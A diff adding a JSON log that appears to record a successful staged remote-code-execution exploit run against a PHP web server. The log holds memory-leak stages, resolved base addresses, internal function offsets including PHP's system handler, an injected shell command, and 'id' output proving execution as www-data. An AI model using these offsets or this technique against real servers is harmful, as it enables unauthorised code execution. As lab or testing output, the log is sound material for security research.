@@ -1,0 +1,120 @@
+{
+ "stages": [
+  {
+   "stage": "A1",
+   "rc": 0,
+   "status": "HTTP/1.0 500 Internal Server Error",
+   "bytes": 185,
+   "elapsed": 0.06
+  },
+  {
+   "stage": "B1",
+   "i": 0,
+   "bytes": 233,
+   "status": "HTTP/1.1 200 OK",
+   "leak": "err:no pointers"
+  },
+  {
+   "stage": "B1",
+   "i": 1,
+   "bytes": 233,
+   "status": "HTTP/1.1 200 OK",
+   "leak": "err:no pointers"
+  },
+  {
+   "stage": "B1",
+   "i": 2,
+   "bytes": 233,
+   "status": "HTTP/1.1 200 OK",
+   "leak": "err:no pointers"
+  },
+  {
+   "stage": "B1",
+   "i": 3,
+   "bytes": 1677793,
+   "status": "HTTP/1.1 200 OK",
+   "decoded": 819208,
+   "lib": "0x7fb4b94c4000",
+   "cands": {
+    "0x7fb4b8400000": 88,
+    "0x7fb4ab400000": 79,
+    "0x7fb4abc00000": 6
+   },
+   "main": "0x7fb4b8400000",
+   "leak": "hit",
+   "chosen": true
+  },
+  {
+   "stage": "B1",
+   "i": 4,
+   "bytes": 233,
+   "status": "HTTP/1.1 200 OK",
+   "leak": "err:no pointers"
+  },
+  {
+   "stage": "A2",
+   "i": 0,
+   "bytes": 185,
+   "status": "HTTP/1.0 500 Internal Server Error"
+  },
+  {
+   "stage": "B2",
+   "i": 0,
+   "bytes": 233,
+   "status": "HTTP/1.1 200 OK"
+  },
+  {
+   "stage": "B2",
+   "i": 1,
+   "bytes": 233,
+   "status": "HTTP/1.1 200 OK"
+  },
+  {
+   "stage": "B2",
+   "i": 2,
+   "bytes": 233,
+   "status": "HTTP/1.1 200 OK"
+  },
+  {
+   "stage": "B2",
+   "i": 3,
+   "bytes": 233,
+   "status": "HTTP/1.1 200 OK"
+  },
+  {
+   "stage": "B2",
+   "i": 4,
+   "bytes": 0,
+   "status": ""
+  }
+ ],
+ "success": true,
+ "marker": "DEB116R3",
+ "zif_off": "0x24cdd0",
+ "zdtor_off": "0x424ff0",
+ "s_off": "0xf7398",
+ "a1": {
+  "bytes": 1060211,
+  "sha256": "8e8fc166e6b326d20bb7611d8ef3cee3bd5da46447985312c1492ab0a44d1eb6"
+ },
+ "b1": {
+  "bytes": 33128677,
+  "sha256": "b6c547e0e9a2bb26607df1521de96f4d5c9adf4621c28b7ab491587b21ae40f2"
+ },
+ "S": "0x7fb4b84f7398",
+ "zif_system": "0x7fb4b9710dd0",
+ "main": "0x7fb4b8400000",
+ "lib": "0x7fb4b94c4000",
+ "lib_minus_main": "0x10c4000",
+ "a2": {
+  "bytes": 279432,
+  "sha256": "7d3e674eed2cad578362a9177c93d67d37b02781a32878be7ea599a3c13ad3c6"
+ },
+ "b2": {
+  "bytes": 451384,
+  "cmd": "id>/out/p1_conc_DEB116R3;echo DEB116R3>>/out/p1_conc_DEB116R3;id>&2;echo DEB116R3>&2",
+  "sha256": "b0818c951b8eb71bc843c9e9a560e0c70fae26eb66f66fbaacc6afa627ac308c"
+ },
+ "proof": "uid=33(www-data) gid=33(www-data) groups=33(www-data)\nDEB116R3\n",
+ "b2_hit": 4
+}
